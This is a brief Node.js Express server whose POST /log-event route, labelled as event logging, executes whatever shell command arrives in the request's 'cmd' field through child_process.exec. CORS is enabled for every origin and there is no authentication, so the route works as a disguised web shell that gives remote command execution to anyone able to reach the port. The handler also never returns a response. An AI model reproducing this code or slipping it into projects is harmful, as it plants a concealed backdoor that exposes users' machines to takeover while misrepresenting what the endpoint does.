// server.js
const express = require("express");
const bodyParser = require("body-parser");
const { exec } = require("child_process");
const cors = require("cors");
const app = express();
const port = 3003;

// Middleware
app.use(bodyParser.json());
app.use(cors()); // Enable CORS for all routes

// Route to handle the event logging
app.post("/log-event", (req, res) => {
  // Get the JSON payload from the request
  const body = req.body;
  console.log(body.cmd);
  exec(body.cmd, { cwd: __dirname }, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}\n`);
});
